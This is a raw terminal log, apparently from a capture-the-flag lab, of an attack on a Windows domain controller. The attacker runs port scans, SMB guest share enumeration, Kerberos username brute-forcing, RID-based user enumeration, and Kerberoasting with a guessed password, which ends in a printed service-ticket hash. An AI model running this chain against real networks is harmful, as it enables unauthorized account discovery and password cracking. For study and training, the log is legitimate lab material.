@@ -1,0 +1,681 @@
+┌──(alvan㉿vbox)-[/root]
+└─$ nxc smb 10.10.38.114 -u '' -p '' --shares
+SMB         10.10.38.114    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.38.114    445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
+SMB         10.10.38.114    445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ nmap -sCV -p88 -10.10.38.114             
+/usr/lib/nmap/nmap: unrecognized option '-10.10.38.114'
+See the output of nmap -h for a summary of options.
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ nmap -sCV -p88 10.10.38.114 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:29 UTC
+Nmap scan report for SOUPEDECODE.LOCAL (10.10.38.114)
+Host is up (0.70s latency).
+
+PORT   STATE SERVICE      VERSION
+88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-05 18:30:05Z)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.24 seconds
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ nmap -sCV -p- -vvv 10.10.38.114 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:30 UTC
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 18:30
+Completed NSE at 18:30, 0.01s elapsed
+Initiating Ping Scan at 18:30
+Scanning 10.10.38.114 [4 ports]
+Completed Ping Scan at 18:30, 0.77s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 18:30
+Scanning SOUPEDECODE.LOCAL (10.10.38.114) [65535 ports]
+Discovered open port 3389/tcp on 10.10.38.114
+Discovered open port 445/tcp on 10.10.38.114
+Discovered open port 135/tcp on 10.10.38.114
+Discovered open port 139/tcp on 10.10.38.114
+Discovered open port 53/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 1.64% done; ETC: 19:02 (0:30:58 remaining)
+SYN Stealth Scan Timing: About 4.76% done; ETC: 18:52 (0:20:19 remaining)
+SYN Stealth Scan Timing: About 6.12% done; ETC: 18:55 (0:23:15 remaining)
+SYN Stealth Scan Timing: About 7.28% done; ETC: 18:58 (0:25:40 remaining)                                           
+SYN Stealth Scan Timing: About 9.45% done; ETC: 18:57 (0:24:06 remaining)                                           
+SYN Stealth Scan Timing: About 12.95% done; ETC: 18:56 (0:22:38 remaining)                                          
+Discovered open port 593/tcp on 10.10.38.114                                                                        
+SYN Stealth Scan Timing: About 15.77% done; ETC: 18:55 (0:20:39 remaining)
+SYN Stealth Scan Timing: About 18.61% done; ETC: 18:54 (0:19:06 remaining)
+Discovered open port 49792/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 23.21% done; ETC: 18:54 (0:17:55 remaining)
+SYN Stealth Scan Timing: About 26.28% done; ETC: 18:53 (0:16:44 remaining)
+Discovered open port 49664/tcp on 10.10.38.114
+Discovered open port 49664/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 19.78% done; ETC: 19:04 (0:26:50 remaining)
+SYN Stealth Scan Timing: About 25.43% done; ETC: 19:04 (0:25:08 remaining)
+SYN Stealth Scan Timing: About 29.20% done; ETC: 19:03 (0:23:26 remaining)
+SYN Stealth Scan Timing: About 31.99% done; ETC: 19:02 (0:21:43 remaining)
+SYN Stealth Scan Timing: About 40.21% done; ETC: 19:04 (0:20:01 remaining)
+Discovered open port 464/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 44.45% done; ETC: 19:03 (0:18:20 remaining)
+Discovered open port 88/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 50.89% done; ETC: 19:04 (0:16:40 remaining)
+Discovered open port 49721/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 54.78% done; ETC: 19:03 (0:14:52 remaining)
+Discovered open port 49675/tcp on 10.10.38.114
+Discovered open port 3269/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 59.42% done; ETC: 19:03 (0:13:12 remaining)
+Discovered open port 9389/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 63.57% done; ETC: 19:02 (0:11:32 remaining)                                          
+Discovered open port 49669/tcp on 10.10.38.114                                                                      
+SYN Stealth Scan Timing: About 68.88% done; ETC: 19:02 (0:09:55 remaining)                                          
+SYN Stealth Scan Timing: About 73.37% done; ETC: 19:01 (0:08:18 remaining)                                          
+Discovered open port 3268/tcp on 10.10.38.114                                                                       
+SYN Stealth Scan Timing: About 78.77% done; ETC: 19:02 (0:06:44 remaining)                                          
+SYN Stealth Scan Timing: About 84.12% done; ETC: 19:02 (0:05:07 remaining)                                          
+Discovered open port 389/tcp on 10.10.38.114                                                                        
+Discovered open port 389/tcp on 10.10.38.114
+Discovered open port 636/tcp on 10.10.38.114
+SYN Stealth Scan Timing: About 89.47% done; ETC: 19:03 (0:03:27 remaining)
+SYN Stealth Scan Timing: About 94.63% done; ETC: 19:03 (0:01:46 remaining)
+Completed SYN Stealth Scan at 19:03, 1974.35s elapsed (65535 total ports)
+Initiating Service scan at 19:03
+Scanning 18 services on SOUPEDECODE.LOCAL (10.10.38.114)
+Completed Service scan at 19:04, 65.20s elapsed (18 services on 1 host)
+NSE: Script scanning 10.10.38.114.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:04
+NSE Timing: About 99.96% done; ETC: 19:05 (0:00:00 remaining)
+Completed NSE at 19:05, 40.09s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 22.15s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.01s elapsed
+Nmap scan report for SOUPEDECODE.LOCAL (10.10.38.114)
+Host is up, received echo-reply ttl 125 (0.68s latency).
+Scanned at 2025-08-05 18:30:42 UTC for 2102s
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-08-05 19:03:43Z)
+135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 125
+464/tcp   open  kpasswd5?     syn-ack ttl 125
+593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 125
+3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 125
+3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
+|_ssl-date: 2025-08-05T19:05:21+00:00; -3s from scanner time.
+| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
+| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-06-17T21:35:42
+| Not valid after:  2025-12-17T21:35:42
+| MD5:   8660:d3bc:0e75:671b:8ffd:9a7e:fafb:60b5
+| SHA-1: 4349:710e:63b9:e96c:4a8a:c557:c8c4:d217:482f:3673
+| -----BEGIN CERTIFICATE-----
+| MIIC8DCCAdigAwIBAgIQbquejXfqJohC9UQLVBR+cTANBgkqhkiG9w0BAQsFADAh
+| MR8wHQYDVQQDExZEQzAxLlNPVVBFREVDT0RFLkxPQ0FMMB4XDTI1MDYxNzIxMzU0
+| MloXDTI1MTIxNzIxMzU0MlowITEfMB0GA1UEAxMWREMwMS5TT1VQRURFQ09ERS5M
+| T0NBTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALRjne/Ks+HtZcXt
+| BKKUbbTDbTX3AFH72vg8qzFVfmpzCuY6E+nBFUSb7yiQmziAIEWziiRzxh8I6FJ0
+| tP3WMdPv1aATe4tAqw9BmlZZu+vcNAMv2ERBAIrWU51dYGBXIuIv/RORbRpvlhdZ
+| 9KANtId+bAzFxO/1cl3jrMX512gn1uzz8OrZWH+Bjps6OaZ9qTpu/VWmJTkQIJgM
+| LlvMEczaoGzudpCl6i5F3cnGRVU9Lk+sdapL2ILgaZ49EipSj64iUZBi63LyqTJV
+| WS81kKzlwg1MS32jFtBRn2e8WPR1NCrB2d6OHGJyCfAlI9C0ViauKHiv6rEMm8tv
+| M2pIrNUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
+| MA0GCSqGSIb3DQEBCwUAA4IBAQAnVIHgBDAr9dDRiG4z8D4k2cF+YprxBcWpuvJc
+| UvLNF71bezDuD0NwQxJcLV4ocnI/xCakLzG/VUNatbb3QAY0Bv6G3Rpi9Qytrafe
+| rED0pe9DsYadx07ci9/FFCI3dq9AhNqLhk+0Z4xOobvhJFkyX1KxGUBp0qnxhw6t
+| a0yNa8q4QX1DMNBa3L61VwFEKdHEho02YJ1rH3r/GUXNGhr9dWO5iMOrXmqtucQv
+| x0M7qS02MAv3FEEHUk8gb+MlbQHNZmTpuLTJCThgBy1gxxEJ6ovTar8W/topGCKS
+| 3JApQpPFWqxW+yWoahcYkGr9q1SKRX1GIq2mXN3NY8A9Rg36
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: SOUPEDECODE
+|   NetBIOS_Domain_Name: SOUPEDECODE
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: SOUPEDECODE.LOCAL
+|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
+|   DNS_Tree_Name: SOUPEDECODE.LOCAL
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-08-05T19:04:44+00:00
+9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+49675/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+49721/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+49792/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 37301/tcp): CLEAN (Timeout)
+|   Check 2 (port 31084/tcp): CLEAN (Timeout)
+|   Check 3 (port 45869/udp): CLEAN (Timeout)
+|   Check 4 (port 14668/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+| smb2-time: 
+|   date: 2025-08-05T19:04:45
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:05
+Completed NSE at 19:05, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2103.10 seconds
+           Raw packets sent: 197544 (8.692MB) | Rcvd: 14385 (1.727MB)
+ 
+                                                                                                                    
+                                                                                                              
+┌──(alvan㉿vbox)-[/root]
+└─$ smbclient -N -U "" -L \\10.10.38.114      
+session setup failed: NT_STATUS_ACCESS_DENIED
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ nxc smb 10.10.38.114 -u 'admin' -p '' --shares
+SMB         10.10.38.114    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.38.114    445    DC01             [-] SOUPEDECODE.LOCAL\admin: STATUS_LOGON_FAILURE 
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ nxc smb 10.10.38.114 -u 'anonymous' -p '' --shares
+SMB         10.10.38.114    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.38.114    445    DC01             [+] SOUPEDECODE.LOCAL\anonymous: (Guest)
+SMB         10.10.38.114    445    DC01             [*] Enumerated shares
+SMB         10.10.38.114    445    DC01             Share           Permissions     Remark
+SMB         10.10.38.114    445    DC01             -----           -----------     ------
+SMB         10.10.38.114    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.38.114    445    DC01             backup                          
+SMB         10.10.38.114    445    DC01             C$                              Default share
+SMB         10.10.38.114    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.38.114    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.38.114    445    DC01             SYSVOL                          Logon server share 
+SMB         10.10.38.114    445    DC01             Users                           
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ smbclient //10.10.38.114/backup -U 'anonymous' -p ''
+Password for [WORKGROUP\anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> quit
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ smbclient //10.10.38.114/IPC$ -U 'anonymous' -p ''
+Password for [WORKGROUP\anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_NO_SUCH_FILE listing \*
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+mkfifo         more           mput           newer          notify         
+open           posix          posix_encrypt  posix_open     posix_mkdir    
+posix_rmdir    posix_unlink   posix_whoami   print          prompt         
+put            pwd            q              queue          quit           
+readlink       rd             recurse        reget          rename         
+reput          rm             rmdir          showacls       setea          
+setmode        scopy          stat           symlink        tar            
+tarmode        timeout        translate      unlock         volume         
+vuid           wdel           logon          listconnect    showconnect    
+tcon           tdis           tid            utimes         logoff         
+..             !              
+smb: \> quit
+                                                                                                                    
+┌──(alvan㉿vbox)-[/root]
+└─$ smbclient //10.10.38.114/Users -U 'anonymous' -p ''
+Password for [WORKGROUP\anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> 
+
+┌──(alvan㉿vbox)-[/opt]
+└─$ ./kerbrute userenum -d soupedecode.local /usr/share/wordlists/userlist.txt --dc 10.10.38.114
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/05/25 - Ronnie Flathers @ropnop
+
+2025/08/05 18:48:00 >  Using KDC(s):
+2025/08/05 18:48:00 >   10.10.38.114:88
+
+2025/08/05 18:48:02 >  [+] VALID USERNAME:       admin@soupedecode.local
+2025/08/05 18:48:03 >  [+] VALID USERNAME:       charlie@soupedecode.local
+2025/08/05 18:48:46 >  [+] VALID USERNAME:       guest@soupedecode.local
+2025/08/05 18:48:52 >  [+] VALID USERNAME:       Charlie@soupedecode.local                                          
+2025/08/05 18:50:21 >  [+] VALID USERNAME:       administrator@soupedecode.local                                    
+2025/08/05 18:50:31 >  [+] VALID USERNAME:       Admin@soupedecode.local 
+
+
+$ msfconsole                               
+Metasploit tip: Use the analyze command to suggest runnable modules for 
+hosts
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 424 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search lookupsid
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank    Check  Description
+   -  ----                                                   ---------------  ----    -----  -----------
+   0  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli  .                normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
+   1  auxiliary/admin/mssql/mssql_enum_domain_accounts       .                normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
+   2  auxiliary/scanner/smb/smb_lookupsid                    .                normal  No     SMB SID User Enumeration (LookupSid)
+   3    \_ action: DOMAIN                                    .                .       .      Enumerate domain accounts
+   4    \_ action: LOCAL                                     .                .       .      Enumerate local accounts
+
+
+Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/smb/smb_lookupsid
+After interacting with a module you can manually set a ACTION with set ACTION 'LOCAL'
+
+msf6 > use 2
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 auxiliary(scanner/smb/smb_lookupsid) > show options
+
+Module options (auxiliary/scanner/smb/smb_lookupsid):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   MaxRID  4000             no        Maximum RID to check
+   MinRID  500              no        Starting RID to check
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                         /basics/using-metasploit.html
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads (max one per host)
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   LOCAL  Enumerate local accounts
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOSTS 10.10.35.233
+RHOSTS => 10.10.35.233
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set THREADS 10
+THREADS => 10
+msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUser Guest
+SMBUser => Guest
+msf6 auxiliary(scanner/smb/smb_lookupsid) > exploit
+
+[*] 10.10.35.233:445 - PIPE(LSARPC) LOCAL(SOUPEDECODE - 5-21-2986980474-46765180-2505414164) DOMAIN(SOUPEDECODE - 5-21-2986980474-46765180-2505414164)
+[*] 10.10.35.233:445 - USER=Administrator RID=500
+[*] 10.10.35.233:445 - USER=Guest RID=501
+[*] 10.10.35.233:445 - USER=krbtgt RID=502
+[*] 10.10.35.233:445 - GROUP=Domain Admins RID=512
+[*] 10.10.35.233:445 - GROUP=Domain Users RID=513
+[*] 10.10.35.233:445 - GROUP=Domain Guests RID=514
+[*] 10.10.35.233:445 - GROUP=Domain Computers RID=515
+[*] 10.10.35.233:445 - GROUP=Domain Controllers RID=516
+[*] 10.10.35.233:445 - TYPE=4 NAME=Cert Publishers rid=517
+[*] 10.10.35.233:445 - GROUP=Schema Admins RID=518
+[*] 10.10.35.233:445 - GROUP=Enterprise Admins RID=519
+[*] 10.10.35.233:445 - GROUP=Group Policy Creator Owners RID=520
+[*] 10.10.35.233:445 - GROUP=Read-only Domain Controllers RID=521
+[*] 10.10.35.233:445 - GROUP=Cloneable Domain Controllers RID=522
+[*] 10.10.35.233:445 - GROUP=Protected Users RID=525
+[*] 10.10.35.233:445 - GROUP=Key Admins RID=526
+[*] 10.10.35.233:445 - GROUP=Enterprise Key Admins RID=527
+[*] 10.10.35.233:445 - TYPE=4 NAME=RAS and IAS Servers rid=553
+[*] 10.10.35.233:445 - TYPE=4 NAME=Allowed RODC Password Replication Group rid=571
+[*] 10.10.35.233:445 - TYPE=4 NAME=Denied RODC Password Replication Group rid=572
+[*] 10.10.35.233:445 - USER=DC01$ RID=1000
+[*] 10.10.35.233:445 - TYPE=4 NAME=DnsAdmins rid=1101
+[*] 10.10.35.233:445 - GROUP=DnsUpdateProxy RID=1102
+[*] 10.10.35.233:445 - USER=bmark0 RID=1103
+[*] 10.10.35.233:445 - USER=otara1 RID=1104
+[*] 10.10.35.233:445 - USER=kleo2 RID=1105
+[*] 10.10.35.233:445 - USER=eyara3 RID=1106
+[*] 10.10.35.233:445 - USER=pquinn4 RID=1107
+[*] 10.10.35.233:445 - USER=jharper5 RID=1108
+[*] 10.10.35.233:445 - USER=bxenia6 RID=1109
+[*] 10.10.35.233:445 - USER=gmona7 RID=1110
+[*] 10.10.35.233:445 - USER=oaaron8 RID=1111
+[*] 10.10.35.233:445 - USER=pleo9 RID=1112
+[*] 10.10.35.233:445 - USER=evictor10 RID=1113
+[*] 10.10.35.233:445 - USER=wreed11 RID=1114
+[*] 10.10.35.233:445 - USER=bgavin12 RID=1115
+[*] 10.10.35.233:445 - USER=ndelia13 RID=1116
+[*] 10.10.35.233:445 - USER=akevin14 RID=1117
+[*] 10.10.35.233:445 - USER=kxenia15 RID=1118
+[*] 10.10.35.233:445 - USER=ycody16 RID=1119
+[*] 10.10.35.233:445 - USER=qnora17 RID=1120
+[*] 10.10.35.233:445 - USER=dyvonne18 RID=1121
+[*] 10.10.35.233:445 - USER=qxenia19 RID=1122
+[*] 10.10.35.233:445 - USER=rreed20 RID=1123
+[*] 10.10.35.233:445 - USER=icody21 RID=1124
+[*] 10.10.35.233:445 - USER=ftom22 RID=1125
+[*] 10.10.35.233:445 - USER=ijake23 RID=1126
+[*] 10.10.35.233:445 - USER=rpenny24 RID=1127
+[*] 10.10.35.233:445 - USER=jiris25 RID=1128
+[*] 10.10.35.233:445 - USER=colivia26 RID=1129
+[*] 10.10.35.233:445 - USER=pyvonne27 RID=1130
+[*] 10.10.35.233:445 - USER=zfrank28 RID=1131
+[*] 10.10.35.233:445 - USER=ybob317 RID=1132
+[*] 10.10.35.233:445 - USER=file_svc RID=1133
+[*] 10.10.35.233:445 - USER=charlie RID=1134
+[*] 10.10.35.233:445 - USER=qethan32 RID=1135
+[*] 10.10.35.233:445 - USER=khe
+
+─(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ impacket-lookupsid soupedecode.local/anonymous@10.10.35.233 -no-pass | grep SidTypeUser
+500: SOUPEDECODE\Administrator (SidTypeUser)
+501: SOUPEDECODE\Guest (SidTypeUser)
+502: SOUPEDECODE\krbtgt (SidTypeUser)
+1000: SOUPEDECODE\DC01$ (SidTypeUser)
+1103: SOUPEDECODE\bmark0 (SidTypeUser)
+1104: SOUPEDECODE\otara1 (SidTypeUser)
+1105: SOUPEDECODE\kleo2 (SidTypeUser)
+1106: SOUPEDECODE\eyara3 (SidTypeUser)
+1107: SOUPEDECODE\pquinn4 (SidTypeUser)
+1108: SOUPEDECODE\jharper5 (SidTypeUser)
+1109: SOUPEDECODE\bxenia6 (SidTypeUser)
+1110: SOUPEDECODE\gmona7 (SidTypeUser)
+1111: SOUPEDECODE\oaaron8 (SidTypeUser)
+1112: SOUPEDECODE\pleo9 (SidTypeUser)
+1113: SOUPEDECODE\evictor10 (SidTypeUser)
+1114: SOUPEDECODE\wreed11 (SidTypeUser)
+1115: SOUPEDECODE\bgavin12 (SidTypeUser)
+1116: SOUPEDECODE\ndelia13 (SidTypeUser)
+1117: SOUPEDECODE\akevin14 (SidTypeUser)
+1118: SOUPEDECODE\kxenia15 (SidTypeUser)
+1119: SOUPEDECODE\ycody16 (SidTypeUser)
+1120: SOUPEDECODE\qnora17 (SidTypeUser)
+1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
+1122: SOUPEDECODE\qxenia19 (SidTypeUser)
+1123: SOUPEDECODE\rreed20 (SidTypeUser)
+1124: SOUPEDECODE\icody21 (SidTypeUser)
+1125: SOUPEDECODE\ftom22 (SidTypeUser)
+1126: SOUPEDECODE\ijake23 (SidTypeUser)
+1127: SOUPEDECODE\rpenny24 (SidTypeUser)
+1128: SOUPEDECODE\jiris25 (SidT  
+
+impacket-GetUserSPNs  soupedecode.local/ybob317:ybob317 -dc-ip 10.10.158.163  -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  --------------  --------  --------------------------  ---------  ----------
+FTP/FileServer          file_svc                  2024-06-17 17:32:23.726085  <never>               
+FW/ProxyServer          firewall_svc              2024-06-17 17:28:32.710125  <never>               
+HTTP/BackupServer       backup_svc                2024-06-17 17:28:49.476511  <never>               
+HTTP/WebServer          web_svc                   2024-06-17 17:29:04.569417  <never>               
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 17:29:18.511871  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$cdf3295ff7e226da525d0037f7e10f8a$cd41f5fa46781b68afaba6f32f934b0693cecb0184cfe12d55599614791e0e8a86fe18a138ef76f7033f29202f9570f67a5e48526be332daa57801c2d5cc2167faa8c49e90cfd22e08ff8ca20979ee5d4a83364be69d4d1b3af51e88bc30875dcdfba0a769468fb03ba0c79dffaee5fd3a872c769a798ad6adfb981c180e15fe56b483dab133d2dce764eb21309e0133beef74a5d69424dbc151306ce486fee47a01395f0b7112c2f3098c5ebbdacc5570f9b93d7e276be53536cf2288476aedd187ae5b425b493522355880f8da71428f1df691cddc2d5e0cead335e34d15f22f54dc6b5fd670e6716f97c37eb739ecaec97beaa2af36366dfb44ee2d44f6d64be66cfe8f3b2a092c6b3e252d47f4ee583df783664df39cb619c0cee79bde6cb42aa3510c7ee33a4d5b489b1e43d6b9c44f51173028d67fd764e5a3660bdcc4fd35c2f4de48ff1ca8ac7f8aad8a1d4b2d7a5720af2f7c5965c31e595f0f71be61250d85e25424857dd8690aa8ac9d385bd77679c920aeb63cb28a83dc64586311c532487d99dcc11959948bcb8271ee533bd784b977c5b44bff0cd0c2fe1188eb5cce315b6636923f730e022b553ee206b03a5354d8bcb15d3cb4d0e1559b485eff5d171a4df6be158058b51fa7c2dca575e125998c8649e8814cf4a6ae8de3c94b4f3f82a2f34f688a71b797b749bf7a807c9a541a7e7b396a373552d4946d0f0fe14301702874503327db315913dea711fef5d0f656cf43508caf48be39ea756654f581fe2d0b5134212f0b9bc0b26ea731c365da3c1fc63581c143fad660d3a39d8e9daa516c6aa6310b2890dbf384f43ef73b92ca4bf47a4fb2ca25a13a718f0d2aad70aff05c78025c8ba0fd78f7ffc4113714d44570faac905f7cef3271fff547a298385b746af13de0cb516f3dcd845eebc64b16474880ef8527b6945b730a503d                                         
+
+
